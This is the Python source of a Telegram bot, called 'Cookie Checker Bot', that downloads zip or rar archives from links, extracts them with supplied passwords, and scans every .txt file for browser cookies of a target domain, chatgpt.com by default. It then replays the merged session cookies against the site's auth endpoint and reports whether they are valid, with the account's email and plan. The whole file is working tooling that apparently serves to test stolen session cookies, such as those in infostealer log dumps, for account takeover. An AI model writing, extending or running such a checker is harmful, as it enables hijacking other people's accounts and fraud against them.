import os
import re
import json
import time
import asyncio
import logging
import shutil
import zipfile
import hashlib
import tempfile
from pathlib import Path

import aiohttp
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== ENV & CONFIG ==========
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN env variable is not set.")

# Railway volume mount path is /app/archives (adjust if you use a different mount)
STORAGE_DIR   = Path(os.getenv("STORAGE_DIR", "archives"))
EXTRACT_DIR   = STORAGE_DIR / "extracted"
SETTINGS_FILE = STORAGE_DIR / "settings.json"
INDEX_FILE    = STORAGE_DIR / "index.json"

STORAGE_DIR.mkdir(parents=True, exist_ok=True)
EXTRACT_DIR.mkdir(parents=True, exist_ok=True)

# ========== LOGGING ==========
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.ext.Updater").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# ========== HELPERS ==========
async def safe_edit(msg, text: str, **kwargs):
    """Edit a Telegram message; swallow network/rate-limit errors."""
    try:
        await msg.edit_text(text, **kwargs)
    except Exception as e:
        logger.debug(f"safe_edit skipped: {e}")

def human_size(b: float) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if b < 1024: return f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} TB"

def make_progress_bar(pct: float, width: int = 20) -> str:
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled)

def _which(*names):
    for n in names:
        p = shutil.which(n)
        if p: return p
    return None

SEVEN_Z = _which("7z", "7za", "7zz")
UNRAR   = shutil.which("unrar")
UNZIP   = shutil.which("unzip")

async def _run(cmd):
    p = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.PIPE)
    _, err = await p.communicate()
    return p.returncode, err.decode(errors="ignore")

async def _run_stream(cmd, progress_cb=None):
    """Stream stdout; parse `NN%` and forward to progress_cb."""
    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    out_chunks, err_chunks = [], []

    async def read_stdout():
        async for raw in proc.stdout:
            text = raw.decode(errors="ignore")
            out_chunks.append(text)
            if progress_cb:
                m = re.search(r"(\d{1,3})%", text)
                if m:
                    try: await progress_cb(int(m.group(1)))
                    except Exception: pass

    async def read_stderr():
        async for raw in proc.stderr:
            err_chunks.append(raw.decode(errors="ignore"))

    await asyncio.gather(read_stdout(), read_stderr())
    await proc.wait()
    return proc.returncode, "".join(out_chunks), "".join(err_chunks)

# ========== SETTINGS ==========
DEFAULT_SETTINGS = {"target_domain": "chatgpt.com", "target_url": "https://chatgpt.com"}

def load_settings():
    if SETTINGS_FILE.exists():
        try: return {**DEFAULT_SETTINGS, **json.loads(SETTINGS_FILE.read_text())}
        except Exception: pass
    return dict(DEFAULT_SETTINGS)

def save_settings(s): SETTINGS_FILE.write_text(json.dumps(s, indent=2))
settings = load_settings()

# ========== INDEX ==========
def load_index():
    if INDEX_FILE.exists():
        try: return json.loads(INDEX_FILE.read_text())
        except Exception: return {}
    return {}

def save_index(i): INDEX_FILE.write_text(json.dumps(i, indent=2))
index = load_index()

# ========== DOWNLOAD ==========
async def download_file(url: str, dest: Path, progress_cb=None) -> int:
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=30, sock_read=300)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(url) as r:
            r.raise_for_status()
            total = int(r.headers.get("Content-Length", 0)) or None
            downloaded = 0
            last_report = 0.0
            last_pct_sent = -1
            start_time = time.time()

            with open(dest, "wb") as f:
                async for chunk in r.content.iter_chunked(1024 * 128):
                    f.write(chunk)
                    downloaded += len(chunk)
                    now = time.time()
                    if now - last_report < 1.5:
                        continue
                    last_report = now
                    elapsed = max(now - start_time, 0.001)
                    speed = downloaded / elapsed
                    pct = (downloaded * 100 / total) if total else None
                    if pct is not None:
                        if abs(pct - last_pct_sent) < 2 and downloaded < total:
                            continue
                        last_pct_sent = pct
                    if progress_cb:
                        try: await progress_cb(downloaded, total, pct, speed)
                        except Exception as e: logger.debug(f"dl cb: {e}")
            return downloaded

# ========== EXTRACTION ==========
def is_password_error(err: str) -> bool:
    e = (err or "").lower()
    return any(k in e for k in (
        "password", "encrypted", "wrong password",
        "cannot open encrypted", "enter password",
    ))

async def extract_with_progress(archive: Path, out_dir: Path,
                                password: str = None, progress_cb=None):
    """Extract with live progress. Returns (ok, method, err)."""
    shutil.rmtree(out_dir, ignore_errors=True)
    out_dir.mkdir(parents=True, exist_ok=True)
    a, o = str(archive), str(out_dir)
    last_err = ""

    # --- 7z ---
    if SEVEN_Z:
        cmd = [SEVEN_Z, "x", "-y", "-bso0", "-bsp1", "-bd", f"-o{o}", a]
        if password:
            cmd.insert(3, f"-p{password}")
        rc, _, err = await _run_stream(cmd, progress_cb)
        if rc == 0:
            if progress_cb:
                try: await progress_cb(100)
                except Exception: pass
            return True, "7z", ""
        last_err = err

    # --- unrar ---
    if archive.suffix.lower() == ".rar" and UNRAR:
        cmd = [UNRAR, "x", "-o+", "-idq"]
        cmd.append(f"-p{password}" if password else "-p-")
        cmd += [a, o + "/"]
        rc, _, err = await _run_stream(cmd, progress_cb)
        if rc == 0:
            if progress_cb:
                try: await progress_cb(100)
                except Exception: pass
            return True, "unrar", ""
        last_err = err

    # --- unzip ---
    if archive.suffix.lower() == ".zip" and UNZIP:
        cmd = [UNZIP, "-o", "-q"]
        if password: cmd.append(f"-P{password}")
        cmd += [a, "-d", o]
        rc, _, err = await _run_stream(cmd, None)
        if rc == 0:
            if progress_cb:
                try: await progress_cb(100)
                except Exception: pass
            return True, "unzip", ""
        last_err = err

    # --- python zipfile fallback ---
    if zipfile.is_zipfile(archive):
        try:
            with zipfile.ZipFile(archive) as z:
                names = z.namelist()
                total = max(len(names), 1)
                for i, name in enumerate(names, 1):
                    z.extract(name, o, pwd=password.encode() if password else None)
                    if progress_cb and (i == total or i % max(total // 100, 1) == 0):
                        try: await progress_cb(int(i * 100 / total))
                        except Exception: pass
            return True, "python-zipfile", ""
        except RuntimeError as e:
            last_err = str(e)
        except Exception as e:
            last_err = str(e)

    return False, "", last_err

# ========== COOKIE PARSING ==========
def parse_cookie_file(path: Path, target_domain: str) -> dict:
    cookies = {}
    if not path.is_file():
        return {}
    try:
        text = path.read_text(encoding="utf-8", errors="ignore").strip()
        if not text: return {}

        # JSON
        if text[0] in "{[":
            try:
                data = json.loads(text)
                if isinstance(data, list):
                    for it in data:
                        if isinstance(it, dict) and {"domain", "name", "value"} <= it.keys():
                            dn = it["domain"].lstrip(".")
                            if target_domain in dn or dn in target_domain:
                                cookies[it["name"]] = it["value"]
                elif isinstance(data, dict):
                    if {"domain", "name", "value"} <= data.keys():
                        dn = data["domain"].lstrip(".")
                        if target_domain in dn or dn in target_domain:
                            cookies[data["name"]] = data["value"]
                    else:
                        cookies.update({k: v for k, v in data.items() if isinstance(v, str)})
                return cookies
            except json.JSONDecodeError:
                pass

        # Netscape
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"): continue
            parts = line.split("\t")
            if len(parts) >= 7:
                domain, _, _, _, _, name, value = parts[:7]
                dn = domain.lstrip(".")
                if target_domain in dn or dn in target_domain:
                    cookies[name] = value
    except Exception as e:
        logger.debug(f"parse {path}: {e}")
    return cookies

# ========== VALIDATION ==========
def validate_cookies(cookies: dict, target_url: str):
    s = requests.Session()
    s.cookies.update(cookies)
    s.headers.update({
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36"),
        "Accept": "application/json, text/plain, */*",
    })
    base = target_url.rstrip("/")
    host = base.lower()

    # ---- ChatGPT ----
    if "chatgpt.com" in host or "chat.openai.com" in host:
        has_session = any(k in cookies for k in (
            "__Secure-next-auth.session-token",
            "__Secure-authjs.session-token",
            "next-auth.session-token",
        ))
        if not has_session:
            return False, "Invalid — no session cookie"
        try:
            r = s.get(f"{base}/api/auth/session", timeout=15)
        except requests.RequestException as e:
            return False, f"Request error: {e}"
        if r.status_code != 200:
            return False, f"Invalid (HTTP {r.status_code})"
        try:
            data = r.json()
        except ValueError:
            return False, "Invalid — non-JSON (Cloudflare?)"
        if data and (data.get("user") or data.get("accessToken")):
            email = (data.get("user") or {}).get("email", "?")
            plan  = (data.get("account") or {}).get("planType", "?")
            return True, f"Valid — {email} ({plan})"
        return False, "Invalid — empty session"

    # ---- generic ----
    try:
        r = s.get(target_url, timeout=15, allow_redirects=True)
        u = r.url.lower()
        if r.status_code == 200 and not any(x in u for x in ("/login", "/signin", "/auth", "/sign-in")):
            return True, f"Valid (HTTP {r.status_code})"
        return False, f"Invalid (HTTP {r.status_code} → {r.url})"
    except requests.RequestException as e:
        return False, f"Request error: {e}"

# ========== SCAN WITH PROGRESS ==========
async def scan_folder_with_progress(folder: Path, progress_cb=None) -> dict:
    if not folder.exists():
        return {"ok": False, "error": "extracted folder missing"}

    txt_files = [f for f in folder.rglob("*.txt") if f.is_file()]
    if not txt_files:
        return {"ok": False, "error": "no .txt files in archive"}

    domain = settings["target_domain"]
    all_cookies = {}
    hit_files = 0
    total = len(txt_files)

    for i, f in enumerate(txt_files, 1):
        # size filter
        try:
            sz = f.stat().st_size
            if sz < 20 or sz > 5_000_000:
                if progress_cb:
                    try: await progress_cb("scan", i, total, len(all_cookies))
                    except Exception: pass
                continue
        except OSError:
            continue

        c = parse_cookie_file(f, domain)
        if c:
            hit_files += 1
            all_cookies.update(c)
        if progress_cb:
            try: await progress_cb("scan", i, total, len(all_cookies))
            except Exception: pass

    if not all_cookies:
        return {"ok": False,
                "error": f"no cookies for '{domain}' in {total} txt files",
                "txt": total}

    if progress_cb:
        try: await progress_cb("validate", 0, 1, len(all_cookies))
        except Exception: pass

    valid, msg = validate_cookies(all_cookies, settings["target_url"])

    if progress_cb:
        try: await progress_cb("done", 1, 1, len(all_cookies))
        except Exception: pass

    return {"ok": True, "valid": valid, "message": msg,
            "cookies": len(all_cookies), "txt": total, "hit_files": hit_files}

def build_phase_text(phase, cur, total, cookies, domain, password=None):
    pw = f"🔑 `{password}`\n" if password else "🔓 no password\n"
    if phase == "scan":
        pct = int(cur * 100 / total) if total else 0
        bar = make_progress_bar(pct)
        return (f"🔍 **Scanning .txt files**\n{pw}"
                f"`{bar}`  {cur}/{total}\n"
                f"🍪 Cookies for `{domain}`: **{cookies}**")
    if phase == "validate":
        return (f"🔍 Scan complete — {cookies} cookies\n{pw}"
                f"🌐 **Validating against** `{settings['target_url']}`...\n"
                f"   • Contacting server…")
    if phase == "done":
        return f"🔍 Scan complete — {cookies} cookies\n{pw}🌐 Validation done ✓"
    return "..."

def make_scan_progress_editor(msg, domain, password=None):
    state = {"last_t": 0.0, "last_pct": -1, "last_phase": None}
    async def cb(phase, cur, total, cookies):
        now = time.time()
        if phase != state["last_phase"]:
            state["last_t"] = 0.0
            state["last_pct"] = -1
            state["last_phase"] = phase
        if phase == "scan" and total > 0:
            pct = int(cur * 100 / total)
            if now - state["last_t"] < 1.5 and pct - state["last_pct"] < 5:
                return
            state["last_t"] = now
            state["last_pct"] = pct
        await safe_edit(msg, build_phase_text(phase, cur, total, cookies, domain, password))
    return cb

# ========== HISTORY / RESULT ==========
def record_history(eid, res):
    entry = index.get(eid)
    if not entry: return
    entry.setdefault("history", []).append({
        "time":    time.strftime("%Y-%m-%d %H:%M:%S"),
        "domain":  settings["target_domain"],
        "valid":   res["valid"],
        "message": res["message"],
        "cookies": res["cookies"],
    })
    entry["last_check"] = entry["history"][-1]
    save_index(index)

def build_result_text(eid, res, password_used=None):
    emo = "✅" if res["valid"] else "❌"
    pw_line = f"🔑 Password: `{password_used}`\n" if password_used else "🔓 No password\n"
    return (
        f"{emo} **Result**\n"
        f"ID: `{eid}`\n"
        f"Domain: `{settings['target_domain']}`\n"
        f"{pw_line}"
        f"Cookies: {res['cookies']} (from {res['hit_files']}/{res['txt']} txt files)\n"
        f"Extractor: {res.get('extractor', '?')}\n"
        f"Result: {res['message']}\n"
        f"🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"↻ `/check {eid}` — 📜 `/history {eid}`"
    )

# ========== COMMANDS ==========
async def start(update, _):
    await update.message.reply_text(
        "🤖 **Cookie Checker Bot**\n\n"
        "Send a **direct .zip / .rar link**. I download, ask for a password if needed, "
        "extract, scan all `.txt` files for cookies of the target domain, and validate them.\n\n"
        f"🎯 Current target: `{settings['target_domain']}`\n\n"
        "**Commands**\n"
        "/settings — show current target\n"
        "/setdomain chatgpt.com — change target domain\n"
        "/seturl https://chatgpt.com — change validation URL\n"
        "/list — list saved archives\n"
        "/check <id> — recheck (fast, uses extracted folder)\n"
        "/recheck <id> — re-extract (asks password again)\n"
        "/history <id> — past testing times\n"
        "/delete <id> — delete everything for that id\n"
        "/cancel — cancel a pending prompt"
    )

async def settings_cmd(update, _):
    await update.message.reply_text(
        f"⚙️ **Settings**\n"
        f"Domain: `{settings['target_domain']}`\n"
        f"URL:    `{settings['target_url']}`"
    )

async def setdomain_cmd(update, ctx):
    if not ctx.args:
        await update.message.reply_text("Usage: `/setdomain chatgpt.com`"); return
    settings["target_domain"] = ctx.args[0].strip().lstrip(".")
    save_settings(settings)
    await update.message.reply_text(f"✅ Domain → `{settings['target_domain']}`")

async def seturl_cmd(update, ctx):
    if not ctx.args:
        await update.message.reply_text("Usage: `/seturl https://chatgpt.com`"); return
    settings["target_url"] = ctx.args[0].strip()
    save_settings(settings)
    await update.message.reply_text(f"✅ URL → `{settings['target_url']}`")

async def list_cmd(update, _):
    if not index: await update.message.reply_text("📭 No saved archives."); return
    lines = ["📦 **Saved Archives**"]
    for eid, e in index.items():
        mb = e.get("size", 0) / 1024 / 1024
        last = e.get("last_check")
        s = f" | {'✅' if last['valid'] else '❌'} {last['time']}" if last else " | no checks"
        pw = "🔑" if e.get("password") else "🔓"
        lines.append(f"`{eid}` {pw} — {e['name']} ({mb:.1f} MB){s}")
    await update.message.reply_text("\n".join(lines))

async def check_cmd(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/check <id>`"); return
    eid = ctx.args[0]
    if eid not in index: await update.message.reply_text("❌ Not found."); return
    ext_path = Path(index[eid]["extract_path"])
    if not ext_path.exists():
        await update.message.reply_text(f"❌ No extracted folder. Use `/recheck {eid}`."); return

    msg = await update.message.reply_text(f"🔍 Checking `{eid}`...")
    pw = index[eid].get("password")
    cb = make_scan_progress_editor(msg, settings["target_domain"], pw)
    res = await scan_folder_with_progress(ext_path, cb)
    if not res["ok"]:
        await safe_edit(msg, f"❌ {res['error']}"); return
    res["extractor"] = index[eid].get("extractor", "?")
    record_history(eid, res)
    await safe_edit(msg, build_result_text(eid, res, pw))

async def recheck_cmd(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/recheck <id>`"); return
    eid = ctx.args[0]
    if eid not in index: await update.message.reply_text("❌ Not found."); return
    archive_path = Path(index[eid]["path"])
    if not archive_path.exists():
        await update.message.reply_text("❌ Archive missing."); return

    ctx.user_data["pending_eid"] = eid
    ctx.user_data["pending_action"] = "recheck"
    saved_pw = index[eid].get("password")
    hint = f"\n(Last password was `{saved_pw}`)" if saved_pw else ""
    await update.message.reply_text(
        f"🔒 Re-extracting `{eid}`.\n"
        f"Send the **password**, or type `no`.{hint}"
    )

async def history_cmd(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/history <id>`"); return
    eid = ctx.args[0]
    if eid not in index: await update.message.reply_text("❌ Not found."); return
    hist = index[eid].get("history", [])
    if not hist:
        await update.message.reply_text("📭 No history yet."); return
    lines = [f"🕒 **History for `{eid}`** ({len(hist)})"]
    for h in hist[-20:]:
        emo = "✅" if h["valid"] else "❌"
        lines.append(f"{emo} `{h['time']}` — {h['domain']} — {h['cookies']} cookies — {h['message']}")
    if len(hist) > 20: lines.append(f"…+{len(hist)-20} more")
    await update.message.reply_text("\n".join(lines))

async def delete_cmd(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/delete <id>`"); return
    eid = ctx.args[0]
    if eid not in index: await update.message.reply_text("❌ Not found."); return
    e = index[eid]
    for k in ("path", "extract_path"):
        p = Path(e.get(k, ""))
        if p.exists():
            if p.is_dir(): shutil.rmtree(p, ignore_errors=True)
            else: p.unlink()
    index.pop(eid); save_index(index)
    await update.message.reply_text(f"🗑️ Deleted `{eid}`")

async def cancel_cmd(update, ctx):
    ctx.user_data.pop("pending_eid", None)
    ctx.user_data.pop("pending_action", None)
    await update.message.reply_text("❌ Cancelled.")

# ========== PASSWORD REPLY ==========
async def handle_password_reply(update, ctx, eid):
    text = update.message.text.strip()

    async def extract_progress_editor(msg, label):
        last_t = [0.0]; last_pct = [-1]
        async def cb(pct):
            now = time.time()
            if now - last_t[0] < 1.5 and pct < 100: return
            if pct == last_pct[0] and pct < 100: return
            last_t[0] = now; last_pct[0] = pct
            bar = make_progress_bar(pct)
            await safe_edit(msg, f"{label}\n`{bar}`  **{pct}%**")
        return cb

    # ---- user said no password ----
    if text.lower() in ("no", "nope", "nah", "none", "skip", "-", "n", "dont", "don't"):
        archive_path = Path(index[eid]["path"])
        ext_path = Path(index[eid]["extract_path"])
        msg = await update.message.reply_text("🔓 Extracting without password...")
        cb = await extract_progress_editor(msg, "🔓 Extracting (no password)")
        ok, method, err = await extract_with_progress(archive_path, ext_path, None, cb)
        if not ok:
            if is_password_error(err):
                await safe_edit(msg,
                    f"⚠️ The archive **is actually encrypted** — it needs a password.\n"
                    f"Send the password, or `/cancel`.\n(Archive: `{eid}`)")
                return
            ctx.user_data.pop("pending_eid", None)
            ctx.user_data.pop("pending_action", None)
            await safe_edit(msg, f"❌ Extraction failed:\n`{err[:200]}`")
            return

        ctx.user_data.pop("pending_eid", None)
        ctx.user_data.pop("pending_action", None)
        index[eid]["extractor"] = method
        index[eid].pop("password", None)
        save_index(index)

        cb2 = make_scan_progress_editor(msg, settings["target_domain"], None)
        res = await scan_folder_with_progress(ext_path, cb2)
        if not res["ok"]:
            await safe_edit(msg, f"❌ {res['error']}"); return
        res["extractor"] = method
        record_history(eid, res)
        await safe_edit(msg, build_result_text(eid, res))
        return

    # ---- user sent a password ----
    archive_path = Path(index[eid]["path"])
    ext_path = Path(index[eid]["extract_path"])
    msg = await update.message.reply_text(f"🔑 Extracting with password `{text}`...")
    cb = await extract_progress_editor(msg, f"🔑 Extracting with password `{text}`")
    ok, method, err = await extract_with_progress(archive_path, ext_path, text, cb)
    if not ok:
        if is_password_error(err):
            await safe_edit(msg,
                f"❌ Wrong password. Try again, or type `no`, or `/cancel`.\n"
                f"(Archive: `{eid}`)")
            return
        ctx.user_data.pop("pending_eid", None)
        ctx.user_data.pop("pending_action", None)
        await safe_edit(msg, f"❌ Extraction failed:\n`{err[:200]}`")
        return

    ctx.user_data.pop("pending_eid", None)
    ctx.user_data.pop("pending_action", None)
    index[eid]["password"] = text
    index[eid]["extractor"] = method
    save_index(index)

    cb2 = make_scan_progress_editor(msg, settings["target_domain"], text)
    res = await scan_folder_with_progress(ext_path, cb2)
    if not res["ok"]:
        await safe_edit(msg, f"❌ {res['error']}"); return
    res["extractor"] = method
    record_history(eid, res)
    await safe_edit(msg, build_result_text(eid, res, text))

# ========== MAIN TEXT HANDLER ==========
async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    pending_eid = ctx.user_data.get("pending_eid")
    if pending_eid:
        return await handle_password_reply(update, ctx, pending_eid)

    raw = update.message.text.strip()
    parts = raw.split(maxsplit=1)
    url = parts[0]
    inline_pw = parts[1].strip() if len(parts) > 1 else None

    if not (url.startswith("http://") or url.startswith("https://")):
        await update.message.reply_text("❌ Send a valid http(s) direct link."); return

    status = await update.message.reply_text("⬇️ Starting download...")

    tmp_dir = Path(tempfile.mkdtemp())
    fname = url.split("?")[0].rstrip("/").split("/")[-1] or "archive"
    if not fname.lower().endswith((".zip", ".rar")): fname += ".zip"
    tmp_path = tmp_dir / fname

    last_edit = [0.0]
    async def dl_cb(done, total, pct, speed):
        now = time.time()
        if now - last_edit[0] < 1.5: return
        last_edit[0] = now
        if total:
            bar = make_progress_bar(pct)
            text = (f"⬇️ **Downloading**\n`{bar}`  **{pct:.1f}%**\n"
                    f"{human_size(done)} / {human_size(total)}\n⚡ {human_size(speed)}/s")
        else:
            text = (f"⬇️ **Downloading**\nDownloaded: {human_size(done)}\n"
                    f"⚡ {human_size(speed)}/s\n(no total size)")
        await safe_edit(status, text)

    try:
        size = await download_file(url, tmp_path, progress_cb=dl_cb)
    except Exception as e:
        await safe_edit(status, f"❌ Download failed: {e}")
        shutil.rmtree(tmp_dir, ignore_errors=True); return

    await safe_edit(status, f"✅ **Download complete**\n📦 {human_size(size)}\n🆔 Saving...")

    eid = hashlib.md5(f"{time.time()}_{url}".encode()).hexdigest()[:8]
    final_path = STORAGE_DIR / f"{eid}_{fname}"
    shutil.move(str(tmp_path), str(final_path))
    shutil.rmtree(tmp_dir, ignore_errors=True)

    ext_path = EXTRACT_DIR / eid
    index[eid] = {
        "id": eid, "name": f"{eid}_{fname}", "path": str(final_path),
        "extract_path": str(ext_path),
        "source_url": url, "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "size": size, "history": [],
    }
    save_index(index)

    # ---- inline password ----
    if inline_pw:
        await safe_edit(status,
            f"✅ {human_size(size)} → `{eid}`\n🔑 Extracting with password `{inline_pw}`...")
        last_t = [0.0]; last_pct = [-1]
        async def _cb(pct):
            now = time.time()
            if now - last_t[0] < 1.5 and pct < 100: return
            if pct == last_pct[0] and pct < 100: return
            last_t[0] = now; last_pct[0] = pct
            bar = make_progress_bar(pct)
            await safe_edit(status,
                f"🔑 **Extracting** (password `{inline_pw}`)\n`{bar}`  **{pct}%**")

        ok, method, err = await extract_with_progress(final_path, ext_path, inline_pw, _cb)
        if not ok:
            if is_password_error(err):
                ctx.user_data["pending_eid"] = eid
                ctx.user_data["pending_action"] = "new"
                await safe_edit(status,
                    f"❌ Inline password was wrong.\n\n"
                    f"🔒 Send the correct **password**, or type `no`.\n(Archive: `{eid}`)")
                return
            await safe_edit(status, f"❌ Extraction failed:\n`{err[:200]}`")
            return

        index[eid]["password"] = inline_pw
        index[eid]["extractor"] = method
        save_index(index)

        cb2 = make_scan_progress_editor(status, settings["target_domain"], inline_pw)
        res = await scan_folder_with_progress(ext_path, cb2)
        if not res["ok"]:
            await safe_edit(status, f"❌ {res['error']}"); return
        res["extractor"] = method
        record_history(eid, res)
        await safe_edit(status, build_result_text(eid, res, inline_pw))
        return

    # ---- ask for password ----
    ctx.user_data["pending_eid"] = eid
    ctx.user_data["pending_action"] = "new"
    await safe_edit(status,
        f"✅ {human_size(size)} → `{eid}`\n\n"
        f"🔒 **Does this archive have a password?**\n"
        f"• Send the **password**, or\n"
        f"• Type `no` to extract without one.\n\n"
        f"(Archive: `{eid}`)")

# ========== MAIN ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",     start))
    app.add_handler(CommandHandler("help",      start))
    app.add_handler(CommandHandler("settings",  settings_cmd))
    app.add_handler(CommandHandler("setdomain", setdomain_cmd))
    app.add_handler(CommandHandler("seturl",    seturl_cmd))
    app.add_handler(CommandHandler("list",      list_cmd))
    app.add_handler(CommandHandler("check",     check_cmd))
    app.add_handler(CommandHandler("recheck",   recheck_cmd))
    app.add_handler(CommandHandler("history",   history_cmd))
    app.add_handler(CommandHandler("delete",    delete_cmd))
    app.add_handler(CommandHandler("cancel",    cancel_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info(f"🤖 Bot running. 7z={SEVEN_Z} unrar={UNRAR} unzip={UNZIP}")
    logger.info(f"🎯 Target: {settings['target_domain']} → {settings['target_url']}")
    logger.info(f"📁 Storage: {STORAGE_DIR.resolve()}")
    app.run_polling()

if __name__ == "__main__":
    main()
